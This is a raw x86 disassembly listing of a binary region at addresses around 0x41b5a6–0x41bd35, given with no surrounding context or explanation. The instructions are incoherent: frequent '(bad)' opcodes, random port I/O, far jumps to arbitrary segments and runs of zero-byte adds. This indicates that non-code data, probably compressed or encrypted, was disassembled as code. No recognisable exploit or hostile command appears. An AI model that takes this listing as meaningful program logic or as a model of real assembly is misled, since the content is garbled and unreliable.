  41b5a6:	dec    edx
  41b5a7:	push   esi
  41b5a8:	sbb    DWORD PTR [ebx-0x72],0x3a50dbff
  41b5af:	(bad)
  41b5b2:	push   0x36d84bd0
  41b5b7:	aad    0xda
  41b5b9:	add    BYTE PTR [eax],al
  41b5bb:	add    BYTE PTR [eax],al
  41b5bd:	add    BYTE PTR [ebx+0x2b],bl
  41b5c0:	mov    esi,0xa53a54db
  41b5c5:	out    dx,al
  41b5c6:	push   eax
  41b5c7:	and    eax,0x254c2804
  41b5cc:	and    al,0x28
  41b5ce:	jl     0x41b5f9
  41b5d0:	sub    al,0x28
  41b5d2:	dec    esp
  41b5d3:	dec    edx
  41b5d4:	add    DWORD PTR ds:0x6d76b290,0x74
  41b5db:	mov    dl,0xf7
  41b5dd:	adc    edx,DWORD PTR [eax-0x247f0344]
  41b5e3:	mov    cs,edi
  41b5e5:	fisttp DWORD PTR [edx+edi*1-0x1b081183]
  41b5ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ed:	add    DWORD PTR [ecx-0x66],edi
  41b5f0:	jp     0x41b62f
  41b5f2:	shl    BYTE PTR [edi],1
  41b5f4:	lods   al,BYTE PTR ds:[esi]
  41b5f5:	daa    
  41b5f6:	test   al,0x29
  41b5f8:	not    DWORD PTR [ecx+0x55]
  41b5fb:	jecxz  0x41b5e0
  41b5fd:	add    BYTE PTR [edi+0x36],0xa3
  41b601:	cld    
  41b602:	sbb    ah,bh
  41b604:	push   cs
  41b605:	or     eax,0x36fd4a9c
  41b60a:	es aaa 
  41b60c:	and    ch,BYTE PTR [ecx]
  41b60e:	jp     0x41b5fc
  41b610:	push   esi
  41b611:	add    cl,BYTE PTR [edi+edi*1-0x39]
  41b615:	add    dl,BYTE PTR [ecx-0x3a513180]
  41b61b:	(bad)  [ecx+0x6a]
  41b61e:	xlat   BYTE PTR ds:[ebx]
  41b61f:	test   eax,edx
  41b621:	in     eax,0x0
  41b623:	add    BYTE PTR [eax],al
  41b625:	add    BYTE PTR [eax],al
  41b627:	xchg   ebx,eax
  41b628:	in     eax,0x3f
  41b62a:	call   0x96af:0x7599dc58
  41b631:	and    edx,eax
  41b633:	inc    ebp
  41b634:	sub    ebp,eax
  41b636:	jb     0x41b688
  41b638:	mov    ?,WORD PTR [edx]
  41b63a:	arpl   cx,ax
  41b63c:	sub    al,0x4b
  41b63e:	add    eax,0xd432a78
  41b643:	mov    eax,ds:0xc4ede833
  41b648:	xor    esi,DWORD PTR [edx]
  41b64a:	call   0xffdb68e2
  41b64f:	adc    BYTE PTR [ecx],bh
  41b651:	sbb    esi,esi
  41b653:	adc    DWORD PTR [eax+0x7b93e90f],ebp
  41b659:	mul    esi
  41b65b:	adc    al,0xb0
  41b65d:	psubsw mm2,QWORD PTR [ebx+0x8ed5d2b]
  41b664:	cmc    
  41b665:	xor    DWORD PTR ds:0x2d2996b8,esp
  41b66b:	test   al,0x96
  41b66d:	sbb    eax,0xee354664
  41b672:	jmp    0xe950aadb
  41b677:	xchg   ebx,eax
  41b678:	jb     0x41b698
  41b67a:	ins    DWORD PTR es:[edi],dx
  41b67b:	inc    edx
  41b67c:	xor    eax,0x630fe9ee
  41b681:	arpl   WORD PTR [eax],ax
  41b683:	inc    ebp
  41b684:	lods   eax,DWORD PTR ds:[esi]
  41b686:	add    BYTE PTR [ecx],bh
  41b688:	mov    cl,0x4e
  41b68a:	sldt   WORD PTR [eax]
  41b68d:	add    BYTE PTR [eax],al
  41b68f:	add    BYTE PTR [ebp+0x29ffee70],ch
  41b695:	mov    edx,0xae9b81dc
  41b69a:	push   cs
  41b69b:	add    BYTE PTR [ecx-0x1200ed46],bh
  41b6a1:	mov    WORD PTR [edx],es
  41b6a3:	mov    ebp,ebp
  41b6a5:	mov    WORD PTR [edx],cs
  41b6a7:	dec    eax
  41b6a8:	(bad)  
  41b6a9:	in     eax,0x56
  41b6ab:	je     0x41b6d5
  41b6ad:	jns    0x41b705
  41b6af:	je     0x41b6e9
  41b6b1:	xor    dh,dh
  41b6b3:	add    al,0x7d
  41b6b5:	icebp  
  41b6b6:	(bad)
  41b6ba:	xor    eax,DWORD PTR [ebx-0x7ae45f3f]
  41b6c0:	jbe    0x41b673
  41b6c2:	push   cs
  41b6c3:	add    BYTE PTR [eax],cl
  41b6c5:	in     eax,0x77
  41b6c7:	inc    esp
  41b6c8:	mov    ecx,0xb6085489
  41b6cd:	sub    ebp,DWORD PTR [ebp+0x0]
  41b6d0:	test   eax,0xd6d291b0
  41b6d5:	sub    al,0xb8
  41b6d7:	add    BYTE PTR [ecx+0x2101a0b0],bh
  41b6dd:	fnsave [edx]
  41b6df:	adc    edx,DWORD PTR [edx]
  41b6e1:	mov    esp,0x2bc14f97
  41b6e6:	aad    0x75
  41b6e8:	jg     0x41b6a5
  41b6ea:	mov    esi,0x255b428b
  41b6ef:	mov    ebx,DWORD PTR [eax-0x45]
  41b6f2:	push   esp
  41b6f3:	add    al,0x0
  41b6f5:	add    BYTE PTR [eax],al
  41b6f7:	add    BYTE PTR [eax],al
  41b6f9:	adc    al,BYTE PTR [edx-0x467ea869]
  41b6ff:	pop    edx
  41b700:	sub    al,0xc2
  41b702:	cdq    
  41b703:	xchg   edi,eax
  41b704:	push   edi
  41b705:	nop
  41b706:	cmp    DWORD PTR [edi+0x4c],esp
  41b709:	jl     0x41b6fb
  41b70b:	das    
  41b70c:	or     edi,0x98731145
  41b712:	jl     0x41b6e4
  41b714:	dec    DWORD PTR [edi-0x798cedb7]
  41b71a:	enter  0x47a,0x93
  41b71e:	push   ss
  41b71f:	cmp    ebp,esi
  41b721:	push   ecx
  41b722:	dec    edx
  41b723:	xor    al,BYTE PTR [eax]
  41b725:	nop
  41b726:	adc    eax,0x51bf8921
  41b72b:	addr16 dec esp
  41b72d:	pushf  
  41b72e:	enter  0xbfc,0x7c
  41b732:	push   esi
  41b733:	(bad)  
  41b734:	cli    
  41b735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b736:	mov    bl,0x30
  41b738:	mov    ecx,DWORD PTR [ebp+0x3d]
  41b73b:	cmp    BYTE PTR [esi-0x80],al
  41b73e:	(bad)  
  41b73f:	sbb    edx,DWORD PTR [ecx+0x43]
  41b742:	js     0x41b787
  41b744:	mov    ecx,DWORD PTR [esi+0x4d]
  41b747:	retf   0xb380
  41b74a:	dec    ecx
  41b74b:	adc    al,BYTE PTR [ebx-0xb140e30]
  41b751:	dec    esi
  41b752:	dec    ebp
  41b753:	adc    al,BYTE PTR [eax]
  41b755:	nop
  41b756:	leave  
  41b757:	int    0x7e
  41b759:	or     bl,BYTE PTR [esi+0x112e]
  41b75f:	add    BYTE PTR [eax],al
  41b761:	add    BYTE PTR [ebx],bl
  41b763:	jle    0x41b793
  41b765:	and    al,0x7b
  41b767:	inc    ebx
  41b768:	adc    eax,0x2e8e0936
  41b76d:	and    al,0x13
  41b76f:	and    esp,edi
  41b771:	or     al,0x13
  41b773:	and    al,0xf9
  41b775:	cld    
  41b776:	xchg   ebp,ecx
  41b778:	les    esi,FWORD PTR [edx-0x6a]
  41b77b:	add    dl,BYTE PTR [esi+0x24]
  41b77e:	pushf  
  41b77f:	ds adc eax,0xb8b24b31
  41b785:	jge    0x41b7d7
  41b787:	shr    DWORD PTR [ebp-0x612646b8],cl
  41b78d:	lds    ecx,FWORD PTR [ebx+0x38c409b2]
  41b793:	aas    
  41b794:	mov    DWORD PTR [eax+0x19],edx
  41b797:	(bad)  
  41b798:	adc    edi,eax
  41b79a:	in     eax,0x27
  41b79c:	mov    ecx,DWORD PTR [edi]
  41b79e:	frstor [edi]
  41b7a0:	pop    ds
  41b7a1:	add    DWORD PTR [ecx-0x5d],0x3326fe7b
  41b7a8:	clc    
  41b7a9:	icebp  
  41b7aa:	aam    0xe2
  41b7ac:	stc    
  41b7ad:	cli    
  41b7ae:	adc    dh,BYTE PTR [edx+0x7f9003f6]
  41b7b4:	xor    BYTE PTR [edi-0x41],al
  41b7b7:	shr    edi,cl
  41b7b9:	cli    
  41b7ba:	adc    bh,BYTE PTR [esi]
  41b7bc:	clc    
  41b7bd:	add    edx,DWORD PTR [eax-0x6ff882d1]
  41b7c3:	mov    ds:0xdd7b,eax
  41b7c8:	add    BYTE PTR [eax],al
  41b7ca:	add    bh,ah
  41b7cc:	xor    bh,al
  41b7ce:	test   BYTE PTR [esi+edx*4-0x9],bl
  41b7d2:	add    eax,DWORD PTR [eax-0x157d334e]
  41b7d8:	mov    cl,0xf7
  41b7da:	add    edi,DWORD PTR [eax-0x6ffc3cea]
  41b7e0:	sub    eax,0x6212fab8
  41b7e5:	clc    
  41b7e6:	add    edx,DWORD PTR [eax+0x18f83991]
  41b7ec:	in     eax,0xe3
  41b7ee:	fstp   TBYTE PTR [edx+0x903f79b]
  41b7f4:	inc    edx
  41b7f5:	jae    0x41b7e8
  41b7f7:	pushf  
  41b7f8:	ss inc eax
  41b7fa:	add    edx,DWORD PTR [eax-0x5bc79f4e]
  41b800:	sbb    cl,BYTE PTR [edi]
  41b802:	mov    ds:0x620eb2a1,al
  41b807:	pop    ebx
  41b808:	xor    eax,0x42e7f6ca
  41b80d:	psubsw mm2,QWORD PTR [ebx-0x1da9f164]
  41b814:	mov    esi,0xa73a1f99
  41b819:	push   ss
  41b81a:	push   ecx
  41b81b:	cmc    
  41b81c:	push   ecx
  41b81d:	adc    cl,ch
  41b81f:	mov    esi,0x5b279a01
  41b824:	xchg   esi,eax
  41b825:	add    ebp,ecx
  41b827:	xchg   ebx,eax
  41b828:	ss iret 
  41b82a:	popf   
  41b82b:	mov    al,0xe3
  41b82d:	xlat   BYTE PTR ds:[ebx]
  41b82e:	loopne 0x41b830
  41b830:	add    BYTE PTR [eax],al
  41b832:	add    BYTE PTR [eax],al
  41b834:	pop    edx
  41b835:	jle    0x41b89a
  41b837:	ret    0xc2b5
  41b83a:	aas    
  41b83b:	push   cs
  41b83c:	rcr    dl,0x91
  41b83f:	lods   eax,DWORD PTR ds:[esi]
  41b840:	xchg   ebx,eax
  41b841:	das    
  41b842:	add    al,0x81
  41b844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b845:	jb     0x41b855
  41b847:	ins    BYTE PTR es:[edi],dx
  41b848:	shl    DWORD PTR [ebp+0x3a2cba1d],cl
  41b84e:	pop    ss
  41b84f:	jo     0x41b7f5
  41b851:	mov    dh,0x97
  41b853:	xor    esp,ebx
  41b855:	cmp    BYTE PTR [edi-0x1b],dl
  41b858:	mov    ah,0xb3
  41b85a:	and    DWORD PTR [ecx+0x6c5a764b],ebp
  41b860:	int3   
  41b861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b862:	dec    ecx
  41b863:	imul   ebp,DWORD PTR [ebp-0x4e],0xde40ba99
  41b86a:	stc    
  41b86b:	in     al,0x77
  41b86d:	jmp    0x41b8d1
  41b86f:	out    dx,al
  41b870:	push   ecx
  41b871:	cmp    al,0x15
  41b873:	gs aam 0xa4
  41b876:	jecxz  0x41b84a
  41b878:	pushf  
  41b879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87a:	sbb    al,0x62
  41b87c:	leave  
  41b87d:	jle    0x41b818
  41b87f:	add    BYTE PTR [edi],dh
  41b881:	iret   
  41b882:	iret   
  41b883:	push   eax
  41b884:	call   0x8eb5:0x6916980e
  41b88b:	ds jns 0x41b82f
  41b88e:	push   ss
  41b88f:	inc    esi
  41b890:	loop   0x41b88e
  41b892:	ins    DWORD PTR es:[edi],dx
  41b893:	imul   esp,DWORD PTR ds:[eax+0x8bc7],0x2c000000
  41b89e:	shl    esi,0x38
  41b8a1:	inc    edi
  41b8a2:	mov    ch,0xe
  41b8a4:	mov    ecx,DWORD PTR [ecx-0x4bf01c4f]
  41b8aa:	jg     0x41b897
  41b8ac:	(bad)  
  41b8ad:	jle    0x41b896
  41b8af:	mov    DWORD PTR [ebx-0x4e],0x79855a73
  41b8b6:	mov    ds:0x30f18314,al
  41b8bb:	out    dx,al
  41b8bc:	jle    0x41b8e9
  41b8be:	out    0xc7,al
  41b8c0:	mov    bh,BYTE PTR [edx-0x46cdeff1]
  41b8c6:	jnp    0x41b914
  41b8c8:	pop    ebp
  41b8c9:	xor    dh,bh
  41b8cb:	adc    DWORD PTR [eax],eax
  41b8cd:	adc    al,0xae
  41b8cf:	stc    
  41b8d0:	sub    ebp,0xffffffc8
  41b8d3:	inc    esp
  41b8d4:	push   edi
  41b8d5:	bound  esp,QWORD PTR [esi+esi*8]
  41b8d8:	adc    esp,ebp
  41b8da:	mov    ah,0xe
  41b8dc:	test   BYTE PTR [ecx],ch
  41b8de:	sub    dl,BYTE PTR [edx+0xeb4b814]
  41b8e4:	push   0xffffffbb
  41b8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e7:	pop    eax
  41b8e8:	lock loope 0x41b896
  41b8eb:	mov    esp,0x43adfeff
  41b8f0:	or     al,0x4c
  41b8f2:	lock ret 0x6850
  41b8f6:	scas   eax,DWORD PTR es:[edi]
  41b8f7:	pop    ebx
  41b8f8:	or     BYTE PTR [ecx],al
  41b8fa:	or     dh,BYTE PTR [edx+0x6d1b9000]
  41b900:	mov    edi,0x0
  41b905:	add    BYTE PTR [edi-0x7800346a],bl
  41b90b:	sbb    ah,al
  41b90d:	inc    edx
  41b90e:	fs sbb al,0xe7
  41b911:	xor    DWORD PTR [eax+0x1a],0x12
  41b915:	add    BYTE PTR [edi-0x3f21d318],bl
  41b91b:	sub    BYTE PTR [edi+0x501d3c42],bl
  41b921:	or     BYTE PTR ds:0x384fe257,al
  41b927:	jp     0x41b8c9
  41b929:	cld    
  41b92a:	inc    edi
  41b92b:	cmp    esi,edx
  41b92d:	dec    ebp
  41b92e:	rcr    BYTE PTR [ecx],1
  41b930:	dec    esp
  41b931:	(bad)  
  41b932:	ficom  WORD PTR [esi-0x35c70fdc]
  41b938:	mov    al,ds:0x27a527fc
  41b93d:	and    BYTE PTR [eax],ch
  41b93f:	popf   
  41b940:	xchg   esi,eax
  41b941:	(bad)  
  41b942:	pop    ss
  41b943:	sbb    eax,0x480f4fd2
  41b948:	xor    cl,BYTE PTR [ebx-0x4636d6ab]
  41b94e:	inc    ecx
  41b94f:	xor    esi,esi
  41b951:	imul   edx,DWORD PTR [ecx-0x1fb59ab0],0xe7ae86b1
  41b95b:	sbb    BYTE PTR [edx+0x4d],ch
  41b95e:	mov    ah,0x1
  41b960:	jno    0x41b8ff
  41b962:	xchg   ecx,eax
  41b963:	sbb    DWORD PTR [ecx],edx
  41b965:	shl    BYTE PTR [eax+0x0],0x7d
  41b969:	and    al,0x0
  41b96b:	add    BYTE PTR [eax],al
  41b96d:	add    BYTE PTR [eax],al
  41b96f:	adc    eax,0x19e7e2e7
  41b974:	stos   DWORD PTR es:[edi],eax
  41b975:	cmc    
  41b976:	cld    
  41b977:	popa   
  41b978:	xchg   esi,eax
  41b979:	dec    edi
  41b97a:	cld    
  41b97b:	inc    eax
  41b97c:	mov    fs,WORD PTR [edi]
  41b97e:	lock mov eax,0x9cb1beb2
  41b984:	das    
  41b985:	jnp    0x41b9c0
  41b987:	mov    al,ds:0x8cb5221a
  41b98c:	das    
  41b98d:	jno    0x41ba00
  41b98f:	cwde   
  41b990:	cmp    ecx,esi
  41b992:	and    BYTE PTR [ecx-0x5a],0xcb
  41b996:	xor    dl,BYTE PTR [eax-0x17]
  41b999:	cmp    esp,edi
  41b99b:	in     eax,0x71
  41b99d:	jo     0x41b9d9
  41b99f:	mov    WORD PTR [ebx],?
  41b9a1:	repz out 0xa6,eax
  41b9a4:	jmp    0x3412026c
  41b9a9:	aaa    
  41b9aa:	add    BYTE PTR [ecx+0x4171ef74],cl
  41b9b0:	sbb    eax,DWORD PTR [edx+ebx*2]
  41b9b3:	mov    WORD PTR [edi+esi*8+0x78da82e6],ds
  41b9ba:	inc    eax
  41b9bb:	nop
  41b9bc:	das    
  41b9bd:	ret    
  41b9be:	imul   eax,DWORD PTR [edx-0x207f088e],0xffffffa5
  41b9c5:	out    0x82,eax
  41b9c7:	mov    bh,0xb6
  41b9c9:	test   DWORD PTR [edx-0x41084591],0x44618707
  41b9d3:	add    BYTE PTR [eax],al
  41b9d5:	add    BYTE PTR [eax],al
  41b9d7:	add    BYTE PTR [eax-0x2fcd05e5],dl
  41b9dd:	cmp    dh,bh
  41b9df:	sub    BYTE PTR [edi],0xa6
  41b9e2:	sar    DWORD PTR [edx-0x6b],0x3d
  41b9e6:	sub    ebp,eax
  41b9e8:	or     BYTE PTR [ecx-0x41b818d7],dh
  41b9ee:	jo     0x41b9e5
  41b9f0:	adc    BYTE PTR [ecx-0x48c20911],ch
  41b9f6:	pusha  
  41b9f7:	adc    al,0x2a
  41b9f9:	mov    dl,0xac
  41b9fb:	push   ecx
  41b9fc:	mov    WORD PTR [edx+0xf],fs
  41b9ff:	call   0x1cdd72ce
  41ba04:	pushf  
  41ba05:	push   ss
  41ba06:	repnz pop ecx
  41ba08:	mov    dh,0x2d
  41ba0a:	and    DWORD PTR [ecx-0x54286fb2],ebp
  41ba10:	(bad)  
  41ba11:	cs (bad) 
  41ba13:	jge    0x41b9ac
  41ba15:	sub    eax,0x81e2e9ee
  41ba1a:	inc    esp
  41ba1b:	push   ss
  41ba1c:	sti    
  41ba1d:	sbb    al,0x22
  41ba1f:	xchg   edx,eax
  41ba20:	jmp    0x1aa8:0x6f1a1687
  41ba27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba28:	cmp    al,0x29
  41ba2a:	psubsw mm3,mm2
  41ba2d:	clc    
  41ba2e:	cdq    
  41ba2f:	push   edx
  41ba30:	int3   
  41ba31:	mov    DWORD PTR [edx],esi
  41ba33:	in     eax,dx
  41ba34:	imul   ebp,DWORD PTR [ebp+0x48],0x46
  41ba38:	ss xor eax,0x553
  41ba3e:	add    BYTE PTR [eax],al
  41ba40:	add    BYTE PTR [ebp+eiz*8-0x3d4a22b4],al
  41ba47:	cdq    
  41ba48:	xchg   edi,eax
  41ba49:	add    DWORD PTR [ebx+0x3b8f9fed],0xffffffdc
  41ba50:	adc    ecx,edi
  41ba52:	test   ch,ch
  41ba54:	push   ss
  41ba55:	jmp    0x981a:0x8a2a99b3
  41ba5c:	lods   eax,DWORD PTR ds:[esi]
  41ba5d:	lahf   
  41ba5e:	ret    0x8d97
  41ba61:	xchg   edi,eax
  41ba62:	into   
  41ba63:	daa    
  41ba64:	xchg   ebp,eax
  41ba65:	(bad)
  41ba69:	jae    0x41ba98
  41ba6b:	out    dx,al
  41ba6c:	jmp    0xf0a627cf
  41ba71:	stos   BYTE PTR es:[edi],al
  41ba72:	mov    WORD PTR [edx],es
  41ba74:	out    0x44,al
  41ba76:	or     BYTE PTR [edi],0xe9
  41ba79:	xchg   ebx,eax
  41ba7a:	cmp    DWORD PTR [ebx+0x0],ebx
  41ba7d:	(bad)  
  41ba7e:	ret    0xdcf6
  41ba81:	pushf  
  41ba82:	pop    ss
  41ba83:	jmp    0x41ba10
  41ba85:	(bad)  
  41ba86:	ficom  WORD PTR [ecx+0x258f5dd2]
  41ba8c:	pop    edx
  41ba8d:	lods   eax,DWORD PTR ds:[esi]
  41ba8e:	popf   
  41ba8f:	jo     0x41ba14
  41ba91:	ja     0x41ba51
  41ba93:	in     eax,dx
  41ba94:	je     0x41ba47
  41ba96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba97:	push   ecx
  41ba98:	and    al,0x59
  41ba9a:	sub    ebx,0xffaa6d72
  41baa0:	mov    eax,0xffee1520
  41baa5:	add    BYTE PTR [eax],al
  41baa7:	add    BYTE PTR [eax],al
  41baa9:	add    BYTE PTR [ecx],dl
  41baab:	jl     0x41baf2
  41baad:	push   esi
  41baaf:	stos   DWORD PTR es:[edi],eax
  41bab0:	in     eax,0x85
  41bab2:	mul    BYTE PTR [edi]
  41bab4:	xchg   edx,eax
  41bab5:	sbb    ch,BYTE PTR [eax-0x4f]
  41bab8:	push   cs
  41bab9:	mov    edi,DWORD PTR [edx-0x27]
  41babc:	push   edx
  41babd:	and    al,0x99
  41babf:	xchg   esp,eax
  41bac0:	movsx  ebp,BYTE PTR ds:[edx]
  41bac4:	push   ebx
  41bac5:	adc    eax,0xffffffcc
  41bac8:	bound  ecx,QWORD PTR [ecx]
  41baca:	mov    edx,0x32753719
  41bacf:	mov    ebp,DWORD PTR [esi]
  41bad1:	jmp    0x41bafe
  41bad3:	mov    ebx,DWORD PTR [eax]
  41bad5:	pop    ecx
  41bad6:	push   gs
  41bad8:	sbb    DWORD PTR [edi+0x39],eax
  41badb:	ficom  DWORD PTR [edx+0x24]
  41bade:	fst    DWORD PTR [esi+ebp*8+0x2a8ae7eb]
  41bae5:	lea    ebx,ds:0x915936cd
  41baeb:	outs   dx,BYTE PTR ds:[esi]
  41baec:	pop    es
  41baed:	add    ecx,edi
  41baef:	mov    dl,BYTE PTR ds:0x36d2a58d
  41baf5:	jmp    0x41bad2
  41baf7:	mov    ah,BYTE PTR [edi]
  41baf9:	lea    edx,[eax+0x69282eef]
  41baff:	repz mov ebp,0x481b9118
  41bb05:	add    eax,0x282edf05
  41bb0a:	dec    edx
  41bb0b:	repz dec esp
  41bb0d:	adc    eax,DWORD PTR [eax]
  41bb0f:	add    BYTE PTR [eax],al
  41bb11:	add    BYTE PTR [eax],al
  41bb13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb14:	pop    ebx
  41bb15:	not    DWORD PTR [di]
  41bb18:	push   esp
  41bb19:	jecxz  0x41ba9e
  41bb1b:	ficomp DWORD PTR [edx]
  41bb1d:	adc    al,BYTE PTR [eax]
  41bb1f:	sbb    edx,DWORD PTR [edx+ecx*8-0x15]
  41bb23:	mov    eax,ds:0x50841219
  41bb28:	cs cmp al,0x6a
  41bb2b:	mov    dh,0x9e
  41bb2d:	popf   
  41bb2e:	and    ebp,DWORD PTR [edx+ebx*1]
  41bb31:	adc    al,BYTE PTR [eax]
  41bb33:	leave  
  41bb34:	xor    DWORD PTR [esi+0x18],ebp
  41bb37:	xchg   ecx,eax
  41bb38:	sbb    ebx,esi
  41bb3a:	jne    0x41bae8
  41bb3c:	sahf   
  41bb3d:	ins    DWORD PTR es:[edi],dx
  41bb3e:	and    ecx,DWORD PTR [edx+ebx*1]
  41bb41:	adc    al,BYTE PTR [eax]
  41bb43:	inc    edi
  41bb44:	add    al,0x32
  41bb46:	push   eax
  41bb47:	or     eax,0xe3280e5e
  41bb4c:	dec    ecx
  41bb4d:	retf   0xfe8
  41bb50:	sbb    edx,DWORD PTR [edx]
  41bb52:	mov    DWORD PTR [ebp+esi*4-0x66b6cede],esi
  41bb59:	lods   eax,DWORD PTR ds:[esi]
  41bb5a:	adc    ecx,DWORD PTR ds:0xf942e2da
  41bb60:	das    
  41bb61:	cmp    BYTE PTR [ebx+0x575df55c],cl
  41bb67:	call   0xf840d2b6
  41bb6c:	aas    
  41bb6d:	xor    eax,0x35fd448b
  41bb72:	push   edi
  41bb73:	clc    
  41bb74:	push   esi
  41bb75:	pop    ss
  41bb76:	inc    DWORD PTR [eax]
  41bb78:	add    BYTE PTR [eax],al
  41bb7a:	add    BYTE PTR [eax],al
  41bb7c:	fbstp  TBYTE PTR [edx+0x37405261]
  41bb82:	inc    esp
  41bb83:	sub    BYTE PTR [ebx+eax*4+0x7255e481],ah
  41bb8a:	test   DWORD PTR [esi+0x13c335d1],0x8f07f553
  41bb94:	shl    DWORD PTR [edi],1
  41bb96:	or     al,0x28
  41bb98:	mov    BYTE PTR ds:0xf45313a6,dh
  41bb9e:	daa    
  41bb9f:	mov    ecx,eax
  41bba1:	push   0xffffffa8
  41bba3:	(bad)  
  41bba4:	iret   
  41bba5:	mov    dl,0xf4
  41bba7:	dec    eax
  41bba8:	push   edx
  41bba9:	add    BYTE PTR [ebp-0x67976e3b],0x52
  41bbb0:	shl    BYTE PTR [edx+0x7ab4487a],1
  41bbb6:	hlt    
  41bbb7:	inc    edi
  41bbb8:	push   edx
  41bbb9:	xor    BYTE PTR [eax+0x48],0xb4
  41bbbd:	fisub  WORD PTR [edi-0x40293c70]
  41bbc3:	xor    eax,0x3d182e1
  41bbc8:	call   0x8d46f2f1
  41bbcd:	inc    ebp
  41bbce:	cmp    BYTE PTR [edi-0x14784909],al
  41bbd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd5:	cmp    eax,0xf61103f7
  41bbda:	jle    0x8f3dd327
  41bbe0:	add    BYTE PTR [eax],al
  41bbe2:	add    BYTE PTR [eax],al
  41bbe4:	add    BYTE PTR [ebx-0x25711c2a],ah
  41bbea:	sbb    ebp,ecx
  41bbec:	repnz pop es
  41bbee:	sub    esi,DWORD PTR [ecx+0x50]
  41bbf1:	mov    ah,0xc2
  41bbf3:	push   DWORD PTR [ecx]
  41bbf5:	in     eax,0xb1
  41bbf7:	test   DWORD PTR [esi-0x2ef129a5],0xe9fdcffb
  41bc01:	xchg   ebx,eax
  41bc02:	cmp    ebp,ebx
  41bc04:	rcl    DWORD PTR [ecx+0x1ee90f1d],1
  41bc0a:	(bad)  
  41bc0b:	idiv   dh
  41bc0d:	ret    0xee2a
  41bc10:	cs push edx
  41bc12:	xchg   DWORD PTR [eax-0x2d548956],ebx
  41bc18:	aad    0x94
  41bc1a:	mov    dl,0xe
  41bc1c:	stos   BYTE PTR es:[edi],al
  41bc1d:	push   cs
  41bc1e:	pop    ss
  41bc1f:	sbb    edx,DWORD PTR [edi+ecx*1]
  41bc22:	adc    al,0x45
  41bc24:	jb     0x41bc5e
  41bc26:	jmp    0xe9e5:0x2ea29793
  41bc2d:	xchg   ebx,eax
  41bc2e:	mov    dl,0x99
  41bc30:	pop    ds
  41bc31:	mov    BYTE PTR ds:0x1b0ff6d8,dh
  41bc37:	psubsw mm2,QWORD PTR [ebx+0x1925543b]
  41bc3e:	push   0x1e
  41bc40:	gs jae 0x41bc6d
  41bc43:	out    dx,al
  41bc44:	jmp    0xe9545e57
  41bc49:	add    BYTE PTR [eax],al
  41bc4b:	add    BYTE PTR [eax],al
  41bc4d:	add    BYTE PTR [edx-0x6c163ac8],ah
  41bc53:	mov    dl,0x99
  41bc55:	pop    ss
  41bc56:	xchg   esp,esp
  41bc58:	shl    BYTE PTR [edi+esi*1-0x27],0x96
  41bc5d:	xchg   ebp,eax
  41bc5e:	ja     0x41bc17
  41bc60:	sub    DWORD PTR [edx],edi
  41bc62:	xor    BYTE PTR [ebx],0xac
  41bc65:	jmp    0x72876efd
  41bc6a:	dec    ecx
  41bc6b:	jecxz  0x41bc5a
  41bc6d:	jo     0x41bcc6
  41bc6f:	into   
  41bc70:	add    dl,dl
  41bc72:	fisub  WORD PTR [edx+0x32a16308]
  41bc78:	call   0x1bc3837d
  41bc7d:	adc    BYTE PTR [eax+0x740561d2],0x14
  41bc84:	sbb    eax,DWORD PTR [edi+ebp*8+0x7a]
  41bc88:	daa    
  41bc89:	repz cmp ebx,DWORD PTR [eax]
  41bc8c:	xchg   ecx,eax
  41bc8d:	jmp    DWORD PTR [eax+esi*4-0x69]
  41bc91:	(bad)  
  41bc92:	mov    ds:0x77015eff,al
  41bc97:	xlat   BYTE PTR ds:[ebx]
  41bc98:	out    0x74,al
  41bc9a:	dec    edi
  41bc9b:	aaa    
  41bc9c:	push   ecx
  41bc9d:	dec    esp
  41bc9e:	cmp    cl,BYTE PTR [esi-0x6e2dffe6]
  41bca4:	xchg   edi,eax
  41bca5:	enter  0xa4d1,0x8a
  41bca9:	add    DWORD PTR [ecx-0x2c8a2c3a],ebp
  41bcaf:	jmp    0x41bc9c
  41bcb1:	je     0x41bcb3
  41bcb3:	add    BYTE PTR [eax],al
  41bcb5:	add    BYTE PTR [eax],al
  41bcb7:	push   ebp
  41bcb8:	sub    eax,0xd55574eb
  41bcbd:	jmp    0x41bcd4
  41bcbf:	test   DWORD PTR [esi+ebp*1],ebp
  41bcc2:	add    dl,bh
  41bcc4:	cli    
  41bcc5:	sbb    DWORD PTR [ebp-0x74ad7ec7],eax
  41bccb:	jge    0x41bca7
  41bccd:	add    cl,BYTE PTR [ebx+0x3be5d7ef]
  41bcd3:	jmp    0x27cc:0xf48afe81
  41bcda:	or     BYTE PTR [edi+0x28],ah
  41bcdd:	outs   dx,BYTE PTR ds:[esi]
  41bcde:	jns    0x41bcae
  41bce0:	fsub   QWORD PTR [ecx+0x17]
  41bce3:	not    BYTE PTR ds:0xd77a8b02
  41bce9:	aam    0x50
  41bceb:	pop    es
  41bcec:	in     al,0xeb
  41bcee:	adc    eax,0x2e2b4d
  41bcf3:	jp     0x41bcef
  41bcf5:	sbb    DWORD PTR [ebx],ebp
  41bcf7:	nop
  41bcf8:	enter  0xdd3b,0xb
  41bcfc:	inc    esi
  41bcfd:	or     cl,BYTE PTR [edi+0xb]
  41bd00:	pop    edx
  41bd01:	push   ss
  41bd02:	sub    edi,edx
  41bd04:	dec    edx
  41bd05:	fadd   DWORD PTR [ebx-0x54]
  41bd08:	add    al,0x11
  41bd0a:	call   0x549f17
  41bd0f:	or     ebx,esi
  41bd11:	ds call 0x53eaa7
  41bd17:	sbb    edi,edx
  41bd19:	sbb    BYTE PTR ss:[eax],al
  41bd1c:	add    BYTE PTR [eax],al
  41bd1e:	add    BYTE PTR [eax],al
  41bd20:	adc    eax,0x7b89455b
  41bd25:	ins    BYTE PTR es:[edi],dx
  41bd26:	inc    DWORD PTR [ecx-0x31097a7]
  41bd2c:	sbb    al,bh
  41bd2e:	adc    DWORD PTR ss:[edi],edi
  41bd31:	xchg   ebp,eax
  41bd32:	rcr    DWORD PTR [eax-0x55],cl
  41bd35:	sbb    al,0x4
